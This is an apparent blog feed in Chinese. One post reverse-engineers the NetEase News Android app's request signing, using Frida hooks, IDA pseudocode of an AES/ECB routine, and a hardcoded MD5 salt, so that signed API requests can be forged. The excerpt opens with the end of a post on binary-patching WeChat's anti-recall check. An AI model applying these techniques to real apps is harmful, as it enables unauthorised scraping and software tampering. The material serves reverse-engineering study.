<img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607172845749.png" class="" title="image-20210607172845749">

<p>2.3. 双击点进去到反汇编可以看到上面有一个条件跳转，将跳转改为无条件跳转<code>jmp</code></p>
<img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607173229697.png" class="" title="image-20210607173229697">

<p>2.4. 右键补丁保存即可</p>
<img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607173333151.png" class="" title="image-20210607173333151"></li>
</ol>
]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>软件破解</tag>
      </tags>
  </entry>
  <entry>
    <title>某易新闻逆向</title>
    <url>/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<p>本文中所有内容仅供研究与学习使用，请勿用于任何商业用途和非法用途，否则后果自负！</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote>
<p>App版本：108.1（1807）豌豆荚下载</p>
<p>设备：Pixel XL</p>
<p>抓包工具：Charles + Postern</p>
<p>反汇编工具：jadx-gui 1.5.0、IDA Pro 7.7</p>
<p>hook：frida 12.8.0</p>
</blockquote>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240729215153417.png" class="" title="image-20240729215153417">

<h6 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h6><pre><code class="url">Add-To-Queue-Millis	1716155605001
data4-Sent-Millis	1716155605002
Cache-Control	no-cache
User-Agent	NewsApp/108.1 Android/8.1.0 (Android/msm8996)
X-NR-Trace-Id	1716155605008_36948439_ZDBkNDQ3NjFhYjZjN2ZiNl9fQW5kcm9pZF9tc204OTk2
X-NR-ISE	0
X-XR-Original-Host	gw.m.163.com
User-C	5pCc57Si
User-RC	UjgzLZ+E4Lemnj+sMro9qwqQ3xlDp4PUECu18073DbE2Sp1cMm3KWoG4EVq0Iff0
User-D	IMi3SNGXpwgZp82uZ0+RgpAF6y/2KeNwsdMOCNyDzAlKc35nEIdpbwHZVg+KaduA
User-VD	xsTHQE9xf3vYWy8XeWECeuLJx3sxZ0eDNrxxIJT5gl6bR7URJ6L1Q7A4TGIYxCEc
User-appid	TItcOwjV9bndQ91C5VadYg==
User-sid	RCeQjCDjXXK9Yh6VD8kD5xMguO+V0brlBu6A5b4whQE=
User-LC	67NqtW9W02z/qXjaEOOHag==
User-N	yEWDFuJGE3Gmj2a0IPdYcA==
X-NR-TS	1716155605026
X-NR-SIGN	f4655b581e7701ef1416dcc22dd94bd9
X-NR-Net-Lib	okhttp
Accept-Encoding	br,gzip
Host	gw.m.163.com
Connection	Keep-Alive
</code></pre>
<h6 id="params"><a href="#params" class="headerlink" title="params"></a>params</h6><p>url解码后</p>
<pre><code class="url">GET /nc/api/v1/search/flow/comp?
start=Kg==&amp;
limit=20&amp;
q=5Lul6Imy5YiX5pS/5bqc6YOo6Zeo5Y+R5biW56ew5ZOI5bC85Lqa6KKr5bmy5o6J&amp;
deviceId=IMi3SNGXpwgZp82uZ0+RgpAF6y/2KeNwsdMOCNyDzAlKc35nEIdpbwHZVg+KaduA&amp;
version=newsclient.108.1.android&amp;channel=c2VhcmNo&amp;canal=UVFfbmV3c195dW55aW5nNA==&amp;
dtype=0&amp;tabname=zonghe&amp;
position=5Lit6Ze06aG154Ot5qac&amp;
ts=1716104794&amp;
sign=nZwy0Lv5hnVYZmQrZWwseXcZ28nunsOjaYWlAW/IxwF48ErR02zJ6/KXOnxX046I&amp;
spever=FALSE HTTP/1.1
</code></pre>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>分析抓包抓到的参数，看哪些是固定的哪些是变动的</p>
<h4 id="Header-1"><a href="#Header-1" class="headerlink" title="Header"></a>Header</h4><p>多次抓包对比参数，看哪些参数是固定的，哪些参数需要逆向获取。用jadx分析app完成反编译后逐个分析</p>
<ol>
<li><h6 id="Host（固定值）："><a href="#Host（固定值）：" class="headerlink" title="Host（固定值）："></a>Host（固定值）：</h6><p><code>gw.m.163.com</code></p>
</li>
<li><h6 id="add-to-queue-millis（整数型13位时间戳）："><a href="#add-to-queue-millis（整数型13位时间戳）：" class="headerlink" title="add-to-queue-millis（整数型13位时间戳）："></a>add-to-queue-millis（整数型13位时间戳）：</h6><p><code>int(time.time() * 1000)</code></p>
</li>
<li><h6 id="data4-sent-millis-整数型13位时间戳-："><a href="#data4-sent-millis-整数型13位时间戳-：" class="headerlink" title="data4-sent-millis(整数型13位时间戳)："></a>data4-sent-millis(整数型13位时间戳)：</h6><p><code>int(time.time() * 1000)</code></p>
</li>
<li><h6 id="cache-control（固定值）："><a href="#cache-control（固定值）：" class="headerlink" title="cache-control（固定值）："></a>cache-control（固定值）：</h6><p><code>no-cache</code></p>
</li>
<li><h6 id="user-agent（随意给一个就好）："><a href="#user-agent（随意给一个就好）：" class="headerlink" title="user-agent（随意给一个就好）："></a>user-agent（随意给一个就好）：</h6><p><code>NewsApp/108.1 Android/8.1.0 (Android/msm8996)</code></p>
</li>
<li><h6 id="x-nr-trace-id："><a href="#x-nr-trace-id：" class="headerlink" title="x-nr-trace-id："></a>x-nr-trace-id：</h6><p><code>整数型13位时间戳 + “_” + ??? + “_” + ZDBkNDQ3NjFhYjZjN2ZiNl9fQW5kcm9pZF9tc204OTk2</code></p>
<p>分析其中的未知参数：<code>???</code></p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240729220622084.png" class="" title="image-20240729220622084">

<ul>
<li>共计找到了37个，着重查看其中<code>Request</code>相关的</li>
</ul>
<p><code>GalaxyResponse.a</code>函数</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240729223016070.png" class="" title="image-20240729223016070">

<ul>
<li>x-nr-trace-id的值来自于<code>this.f12885b</code></li>
</ul>
<pre><code class="js">@Override // com.netease.galaxy.net.IRequest
public GalaxyResponse a() throws Throwable {
    OkHttpClient a2;
    method.header("X-NR-Trace-Id", this.f12885b);

......

public GalaxyRequest(RequestData requestData) {
    this.f12885b = "";
    this.f12885b = c(String.valueOf(hashCode()));	// "???"是一个hashCode
}
</code></pre>
<p>跟进<code>c(String str)</code>函数中</p>
<pre><code class="js">    private String c(String str) {
        return System.currentTimeMillis() + "_" + str + "_" + Galaxy.N(Galaxy.M());
    }
</code></pre>
<ul>
<li>定位到了<code>this.f12885b</code>的来源，写frida脚本获取<code>str</code>的值</li>
</ul>
<p>hook <code>c</code>函数</p>
<pre><code class="js">Java.perform(function(){
    var GalaxyRequest = Java.use("com.netease.galaxy.net.GalaxyRequest")
    GalaxyRequest["c"].implementation = function(str){
        console.log('c is called' + ',' + 'str: ' + str)
        var ret = this.c(str)
        console.log('c ret value is: ' + ret)
        return ret
    }
})
</code></pre>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240729231229342.png" class="" title="image-20240729231229342">

<p>根据返回值可以发现：“ZDBkNDQ3NjFhYjZjN2ZiNl9fQW5kcm9pZF9tc204OTk2”，字符串一直是固定的，那么总结可得</p>
<p><code>整数型13位时间戳 + “_” + “hashCode()” + “_” + ZDBkNDQ3NjFhYjZjN2ZiNl9fQW5kcm9pZF9tc204OTk2</code></p>
</li>
<li><h6 id="X-NR-ISE（固定值）："><a href="#X-NR-ISE（固定值）：" class="headerlink" title="X-NR-ISE（固定值）："></a>X-NR-ISE（固定值）：</h6><p><code>0</code></p>
</li>
<li><p>X-XR-Original-Host（固定值）：</p>
<p><code>gw.m.163.com</code></p>
</li>
<li><p>User系列参数</p>
</li>
</ol>
<blockquote>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730162342692.png" class="" title="image-20240730162342692">

<ul>
<li><p>抓包对比了过后发现<code>user-c</code>的值是会变的</p>
<ol>
<li><p>在jadx中查找<code>user-c</code></p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730110756519.png" class="" title="image-20240730110756519">

<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730111105368.png" class="" title="image-20240730111105368">

<p><code>User-C</code>的值来自于，对<code>StringUtil.e(o2, "UTF-8")</code>返回的字符串进行URL编码，使用UTF-8字符集，hook<code>StringUtil.e()</code>查看编码前的值</p>
<pre><code class="js">Java.perform(function(){
    var StringUtil = Java.use("com.netease.newsreader.support.utils.string.StringUtil")
    StringUtil["e"].implementation = function(str, str2){
        console.log('e is called, ' + 'str: ' + str + 'str2: ' + str2 + "\n")
        var ret = this.e(str, str2)
        console.log('e ret value is: ' + ret + "\n")
        return ret
    }
})
</code></pre>
<p>执行脚本</p>
<pre><code class="js">┌──(root㉿r0env)-[~/Documents/FridaHook]
└─# frida -U -f com.netease.newsreader.activity -l wangyiNews.js 
     ____
    / _  |   Frida 12.8.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       help      -&gt; Displays the help system
   . . . .       object?   -&gt; Display information about 'object'
   . . . .       exit/quit -&gt; Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/
Spawned `com.netease.newsreader.activity`. Use %resume to let the main thread start executing!    
[Google msm8996::com.netease.newsreader.activity]-&gt; %resume 
[Google msm8996::com.netease.newsreader.activity]-&gt; e is called, str: com.netease.newsreader.common.serverconfig.ServerConfigData$Porxystr2: utf-8
                  
e ret value is: Y29tLm5ldGVhc2UubmV3c3JlYWRlci5jb21tb24uc2VydmVyY29uZmlnLlNlcnZlckNvbmZpZ0RhdGEkUG9yeHk=
e is called, str: 头条str2: UTF-8
e ret value is: 5aS05p2h                                                     
e is called, str: com.netease.newsreader.common.serverconfig.ServerConfigData$Porxystr2: utf-8
                  
e ret value is: Y29tLm5ldGVhc2UubmV3c3JlYWRlci5jb21tb24uc2VydmVyY29uZmlnLlNlcnZlckNvbmZpZ0RhdGEkUG9yeHk=
                  
e is called, str: *str2: utf-8
                  
e ret value is: Kg==
                  
e is called, str: 巴黎奥运天天惹韩国人生气str2: utf-8
                  
e ret value is: 5be06buO5aWl6L+Q5aSp5aSp5oO56Z+p5Zu95Lq655Sf5rCU
                  
e is called, str: searchstr2: utf-8
                  
e ret value is: c2VhcmNo
                  
。。。。。。
</code></pre>
<p>访问不同的栏目<code>User-C</code>的值会有变动：</p>
<blockquote>
<p>6KeG6aKR		// base64 -&gt; 视频				</p>
<p>6ZmE6L%2BR		// base64 -&gt; 附近</p>
<p>5aS05p2h		// base64 -&gt; 头条</p>
<p>5aWl6L%2BQ		// base64 -&gt; 奥运</p>
<p>c2VhcmNo		// base64 -&gt; search</p>
<p>等等。。。</p>
</blockquote>
</li>
</ol>
</li>
</ul>
<ol>
<li><p>继续分析<code>User-U</code>、<code>User-D</code>、<code>User-N</code>。。。等参数，跟进<code>getEncryptedParams()</code>方法</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730163214144.png" class="" title="image-20240730163214144">

<p>调用<code>getEncryptedParamsInner(str, i2)</code>方法，跟进查看</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730163419940.png" class="" title="image-20240730163419940">

<p>调用<code>callEncrypt</code>方法，跟进查看</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730163627733.png" class="" title="image-20240730163627733">

<p>调用<code>encrypt</code>方法，跟进查看</p>
<p><code>private static native synchronized byte[] encrypt(Context context, String str, int i2);</code></p>
<p>接下来到了so层，查看此处加载的so文件名</p>
<pre><code class="js">    static {
        try {
            System.loadLibrary("random");
        } catch (Error unused) {
        }
    }
</code></pre>
<p>用IDA打开librandom.so文件，查看<code>Java_com_netease_nr_biz_pc_sync_Encrypt_encrypt</code>方法的实现，在分析之前先hook确认下查找的点没错：</p>
<pre><code class="js">Java.perform(function () {
    var ByteString = Java.use("com.android.okhttp.okio.ByteString")
    var Encrypt = Java.use("com.netease.nr.biz.pc.sync.Encrypt")
    Encrypt["encrypt"].implementation = function (context, str, i2) {
        console.log('encrypt is called' + ', ' + 'context: ' + context + ', ' + 'str: ' + ', ' + 'i2: ' + i2)
        var ret = this.encrypt(context, str, i2)
        console.log('encrypt ret value is ' + JSON.stringify(ret))
        console.log('\n\ncallEncrypt ret str_hex: ' + ByteString.of(ret).hex())
        return ret
    }
})
</code></pre>
<p>执行脚本：</p>
<pre><code class="js">┌──(root㉿r0env)-[~/Documents/FridaHook]
└─# frida -U -f com.netease.newsreader.activity -l wangyiNews.js
     ____
    / _  |   Frida 12.8.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       help      -&gt; Displays the help system
   . . . .       object?   -&gt; Display information about 'object'
   . . . .       exit/quit -&gt; Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/
Spawned `com.netease.newsreader.activity`. Use %resume to let the main thread start executing!
[Google msm8996::com.netease.newsreader.activity]-&gt; %resume  
encrypt is called, context: com.netease.nr.base.activity.BaseApplication@99736ce, str: , i2: 0
encrypt ret value is [104,3,-109,49,-115,-1,47,52,-120,18,25,-25,-39,33,-33,-59,-84,-106,-115,-88,-1,-57,71,43,-74,-46,-92,66,68,-3,46,-98,120,-16,74,-47,-45,108,-55,-21,-14,-105,58,124,87,-45,-114,-120]

callEncrypt ret str_hex: 680393318dff2f34881219e7d921dfc5ac968da8ffc7472bb6d2a44244fd2e9e78f04ad1d36cc9ebf2973a7c57d38e88
encrypt is called, context: com.netease.nr.base.activity.BaseApplication@99736ce, str: , i2: 0
encrypt ret value is [-78,7,-46,-63,-97,29,-40,76,-94,-112,101,-75,74,72,80,-10]

callEncrypt ret str_hex: b207d2c19f1dd84ca29065b54a4850f6
encrypt is called, context: com.netease.nr.base.activity.BaseApplication@99736ce, str: , i2: 0
encrypt ret value is [-116,34,61,0,-117,27,-24,43,-68,-32,54,-58,-34,31,64,10,-19,76,-96,93,97,79,120,-55,-29,-104,18,-76,-13,-52,-40,14,120,-16,74,-47,-45,108,-55,-21,-14,-105,58,124,87,-45,-114,-120]

callEncrypt ret str_hex: 8c223d008b1be82bbce036c6de1f400aed4ca05d614f78c9e39812b4f3ccd80e78f04ad1d36cc9ebf2973a7c57d38e88
</code></pre>
<p>确认没找错点，跟进so中进行分析（环境：ida64_7.7）</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730182957828.png" class="" title="image-20240730182957828">

<ul>
<li>分析后加密函数在<code>doEn</code>中</li>
</ul>
<pre><code class="c++">__int64 __fastcall doEn(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v8; // x22
  __int64 v9; // x23
  __int64 v10; // x22
  __int64 v11; // x24
  __int64 v12; // x20
  char *v13; // x0
  char *v14; // x21
  __int64 v15; // x22
  __int64 v16; // x21
  __int64 v17; // x0
  __int64 v18; // x21
  char *v19; // x22
  __int64 v20; // x23
  char *v21; // x0
  char *v22; // x22
  __int64 v23; // x24
  __int64 v24; // x22
  __int64 v25; // x0
  __int64 v26; // x23
  __int64 v27; // x0
  __int64 v28; // x2

  v8 = (*(__int64 (__fastcall **)(__int64, const char *))(*(_QWORD *)a1 + 48LL))(a1, "java/lang/String");
  v9 = (*(__int64 (__fastcall **)(__int64, const char *))(*(_QWORD *)a1 + 1336LL))(a1, "utf-8");
  v10 = (*(__int64 (__fastcall **)(__int64, __int64, const char *, const char *))(*(_QWORD *)a1 + 264LL))(
          a1,
          v8,
          "getBytes",
          "(Ljava/lang/String;)[B");
  v11 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 272LL))(a1, a5, v10, v9);
  v12 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 272LL))(a1, a4, v10, v9);
  v13 = (char *)malloc(0x15u);
  strcpy(v13, "AES/ECB/PKCS7Padding");
  v14 = v13;
  v15 = (*(__int64 (__fastcall **)(__int64, const char *))(*(_QWORD *)a1 + 1336LL))(a1, "D@V");
  free(v14);
  v16 = (*(__int64 (__fastcall **)(__int64, const char *))(*(_QWORD *)a1 + 48LL))(a1, "javax/crypto/spec/SecretKeySpec");
  v17 = (*(__int64 (__fastcall **)(__int64, __int64, const char *, const char *))(*(_QWORD *)a1 + 264LL))(
          a1,
          v16,
          "&lt;init&gt;",
          "([BLjava/lang/String;)V");
  v18 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 224LL))(
          a1,
          v16,
          v17,
          v11,
          v15);
  v19 = (char *)malloc(0x15u);
  strcpy(v19, "AES/ECB/PKCS7Padding");
  v20 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 1336LL))(a1, v19);
  free(v19);
  v21 = (char *)malloc(3u);
  strcpy(v21, "BC");
  v22 = v21;
  v23 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 1336LL))(a1, v21);
  free(v22);
  v24 = (*(__int64 (__fastcall **)(__int64, const char *))(*(_QWORD *)a1 + 48LL))(a1, "javax/crypto/Cipher");
  v25 = (*(__int64 (__fastcall **)(__int64, __int64, const char *, const char *))(*(_QWORD *)a1 + 904LL))(
          a1,
          v24,
          "getInstance",
          "(Ljava/lang/String;Ljava/lang/String;)Ljavax/crypto/Cipher;");
  v26 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 912LL))(
          a1,
          v24,
          v25,
          v20,
          v23);
  v27 = (*(__int64 (__fastcall **)(__int64, __int64, const char *, const char *))(*(_QWORD *)a1 + 264LL))(
          a1,
          v24,
          "init",
          "(ILjava/security/Key;)V");
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 488LL))(a1, v26, v27, 1LL, v18);
  v28 = (*(__int64 (__fastcall **)(__int64, __int64, const char *, const char *))(*(_QWORD *)a1 + 264LL))(
          a1,
          v24,
          "doFinal",
          "([B)[B");
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 272LL))(a1, v26, v28, v12);
}
</code></pre>
<ul>
<li>这个函数的主要功能是使用 AES 加密算法对输入的数据进行加密。它使用 ECB 模式和 PKCS7Padding 填充方式，并且使用 Bouncy Castle 安全提供者来创建和初始化 <code>Cipher</code> 对象。最终返回加密后的字节数组</li>
</ul>
<p>使用自吐脚本进行hook：</p>
<p><a href="https://blog.csdn.net/nicepainkiller/article/details/132554698?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170902437216800182198144%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=170902437216800182198144&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-132554698-null-null.nonecase&amp;utm_term=hook&amp;spm=1018.2226.3001.4450">脚本1</a></p>
<p><a href="https://www.ayuge.top/mkdocs-material/tools/about_js/%E4%B8%80%E9%94%AEhook%E8%87%AA%E5%90%90%E8%84%9A%E6%9C%AC%E7%BD%91%E9%A1%B5%E7%89%88/#21">脚本2</a></p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731115022085.png" class="" title="image-20240731115022085">

<p>现在可以知道，整个加密流程为：</p>
<p>str -&gt; AES/ECB/PKCS7Padding -&gt;base64</p>
<p>例如：</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731120000205.png" class="" title="image-20240731120000205">

<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731120157628.png" class="" title="image-20240731120157628">

<ul>
<li>使用CyberChef解密成功</li>
</ul>
<p>对照抓包及hook到的参数，可以确定user-rc、user-d、user-vd、user-appid、user-lc、user-n参数的生成都是如此，其原始值大多为某一个值经过base64编码后在经过url编码得到的：</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730203130771.png" class="" title="image-20240730203130771">

<pre><code class="js">user-rc: UjgzLZ+E4Lemnj+sMro9qwqQ3xlDp4PUECu18073DbE2Sp1cMm3KWoG4EVq0Iff0
user-d: IMi3SNGXpwgZp82uZ0+RgpAF6y/2KeNwsdMOCNyDzAlKc35nEIdpbwHZVg+KaduA
user-vd: xsTHQE9xf3vYWy8XeWECeuLJx3sxZ0eDNrxxIJT5gl6bR7URJ6L1Q7A4TGIYxCEc
user-appid: TItcOwjV9bndQ91C5VadYg==
user-lc: 67NqtW9W02z/qXjaEOOHag==
user-n: yEWDFuJGE3Gmj2a0IPdYcA==
</code></pre>
</li>
<li><p>user-sid</p>
<p>在jadx中查找并跟踪</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730204522769.png" class="" title="image-20240730204522769">

<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730204931081.png" class="" title="image-20240730204931081">

<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240730205050783.png" class="" title="image-20240730205050783">

<ul>
<li>获取一个实现了<code>IGalaxyApi</code>接口的对象，并调用<code>getSessionId()</code>方法来获取当前会话的ID，然后将该ID作为字符串返回。对其进行hook：</li>
</ul>
<pre><code class="js">Java.perform(function () {
    var NRGalaxy = Java.use('com.netease.newsreader.newarch.galaxy.NRGalaxy');
    NRGalaxy.G.implementation = function () {
        var originalResult = this.G();
        console.log('G()方法返回值: ' + originalResult);
        return originalResult;
    };
        
    // 为了触发 hook，我们需要获取 NRGalaxy 的实例
    var instance = NRGalaxy.F();
    instance.G(); // 调用 G() 方法
});
</code></pre>
<p>执行脚本：</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731195501940.png" class="" title="image-20240731195501940">

<p>加密返回值，将其与<strong>user-sid</strong>对比</p>
<blockquote>
<p>User-sid	qlNtWweNuThGiTKXJrZSnzEzjaqi2osTzDRV6IYJhvU=</p>
</blockquote>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731204400611.png" class="" title="image-20240731204400611">

<ul>
<li><p>构成：字符串 + 时间戳</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731205136884.png" class="" title="image-20240731205136884">

<ul>
<li>每次重启App后字符串和时间戳会改变，字符串应该是随机生成的，时间戳为App启动的时间戳</li>
</ul>
</li>
</ul>
</li>
</ol>
</blockquote>
<ol start="10">
<li><h6 id="X-NR-TS（整数型13位时间戳）：："><a href="#X-NR-TS（整数型13位时间戳）：：" class="headerlink" title="X-NR-TS（整数型13位时间戳）：："></a>X-NR-TS（整数型13位时间戳）：：</h6><p><code>int(time.time() * 1000)</code></p>
</li>
<li><h6 id="X-NR-SIGN："><a href="#X-NR-SIGN：" class="headerlink" title="X-NR-SIGN："></a>X-NR-SIGN：</h6><p>在jadx中跟踪定位</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731210201783.png" class="" title="image-20240731210201783">

<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731211620243.png" class="" title="image-20240731211620243">

<blockquote>
<p> <code>String n2 = StringUtils.n(((Object) queryString) + HttpUtils.f29796s + ts);</code></p>
<p>将 queryString、HttpUtils.f29796s、ts 进行拼接</p>
<ul>
<li><p>HttpUtils.f29796s是一个静态变量：gNlVGcSKf5</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731212624387.png" class="" title="image-20240731212624387"></li>
</ul>
<p>拼接后使用<code>StringUtils.n()</code>对拼接后的字符串进行MD5摘要计算</p>
<pre><code class="js">    public static String n(String str) {
        if (TextUtils.isEmpty(str)) {
            return str;
        }
        try {
            return a(MessageDigest.getInstance("MD5").digest(g(str, Charset.forName("UTF-8"))), false);
        } catch (NoSuchAlgorithmException e2) {
            throw new AssertionError(e2);
        }
    }
</code></pre>
<p>对这个方法进行hook</p>
<pre><code class="js">Java.perform(function(){
    var StringUtils = Java.use("com.netease.newsreader.framework.util.string.StringUtils")
    StringUtils.n.implementation = function(str){
        console.log("n is called str -&gt; " + str + "\n")
        var ret = this.n(str)
        console.log("n ret value is -&gt; " + ret + "\n")
        return ret
    }
})
</code></pre>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731220339289.png" class="" title="image-20240731220339289">

<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731220744553.png" class="" title="image-20240731220744553">

<ul>
<li>对比后无误</li>
</ul>
</blockquote>
</li>
<li><h6 id="X-NR-Net-Lib（固定值）："><a href="#X-NR-Net-Lib（固定值）：" class="headerlink" title="X-NR-Net-Lib（固定值）："></a>X-NR-Net-Lib（固定值）：</h6><p><code>okhttp</code></p>
</li>
<li><h6 id="Accept-Encoding（固定值）："><a href="#Accept-Encoding（固定值）：" class="headerlink" title="Accept-Encoding	（固定值）："></a>Accept-Encoding	（固定值）：</h6><p><code>br,gzip</code></p>
</li>
</ol>
<h4 id="params-1"><a href="#params-1" class="headerlink" title="params"></a>params</h4><p>搜索关键字定位</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731223022010.png" class="" title="image-20240731223022010">

<ul>
<li>可以看到相关参数都是在这里生成的</li>
</ul>
<p>对数据包进行对比分析后</p>
<pre><code class="js">start=Kg==&amp;		// 固定值
limit=20&amp;		// 固定值
q=5Lul6Imy5YiX5pS/5bqc6YOo6Zeo5Y+R5biW56ew5ZOI5bC85Lqa6KKr5bmy5o6J&amp;		// 搜索词的base64编码
deviceId=IMi3SNGXpwgZp82uZ0+RgpAF6y/2KeNwsdMOCNyDzAlKc35nEIdpbwHZVg+KaduA&amp;
version=newsclient.108.1.android&amp;	// 固定值
channel=c2VhcmNo&amp;	// 栏目的base64编码
canal=UVFfbmV3c195dW55aW5nNA==&amp;		// 固定值：QQ_news_yunying4的base64编码
dtype=0&amp;	// 固定值
tabname=zonghe&amp;		// 固定值
position=5Lit6Ze06aG154Ot5qac&amp;		// 搜索内容的base64编码
ts=1716104794&amp;		// 时间戳
sign=nZwy0Lv5hnVYZmQrZWwseXcZ28nunsOjaYWlAW/IxwF48ErR02zJ6/KXOnxX046I&amp;		// 未知
spever=FALSE HTTP/1.1		// 固定值
</code></pre>
<ol>
<li><h6 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h6></li>
</ol>
<p>根据上一张截图可以知道sign的值来自于str7</p>
<pre><code class="js">截取代码片段
String str7 = s2 + String.valueOf(currentTimeMillis);
if (!TextUtils.isEmpty(str7)) {
    str7 = StringUtil.c(Encrypt.getEncryptedParams(StringUtils.n(str7)));
arrayList.add(new FormPair("sign", str7));
</code></pre>
<ul>
<li><p><code>StringUtils.n(str7)</code>上面分析过是一个计算MD5摘要方法：先对<code>str7</code>进行了MD5操作</p>
</li>
<li><p><code>Encrypt.getEncryptedParams()</code>上面也分析过最终是调用了so中的<strong>AES/ECB/PKCS7Padding</strong>加密</p>
</li>
<li><p><code>StringUtil.c()</code>是对输入字符串进行URLEncoder处理然后返回</p>
<pre><code class="js">    public static String c(String str) {
        if (TextUtils.isEmpty(str)) {
            return "";
        }
        try {
            return URLEncoder.encode(str, "UTF-8");
        } catch (Exception unused) {
            return "";
        }
    }
</code></pre>
<h6 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h6><p>先对<code>StringUtil.n()</code>进行hook拿到<code>str7</code>的MD5摘要值</p>
<p>再把MD5进行AES加密并转为Base64编码</p>
<p>然后hook <code>StringUtil.c()</code>跟它的参数进行比较</p>
<img src="/2024/08/01/%E6%9F%90%E6%98%93%E6%96%B0%E9%97%BB%E9%80%86%E5%90%91/image-20240731232857856.png" class="" title="image-20240731232857856">

<ul>
<li>结果相同</li>
</ul>
</li>
</ul>
<p>所有参数分析完毕</p>
<h3 id="模拟请求"><a href="#模拟请求" class="headerlink" title="模拟请求"></a>模拟请求</h3><p>上述将所有相关参数都分析完毕，接下来写代码对会变动的参数进行还原后重新组包进行模拟请求</p>
<p>请求头中只使用gzip解码，以免处理不了br编码</p>
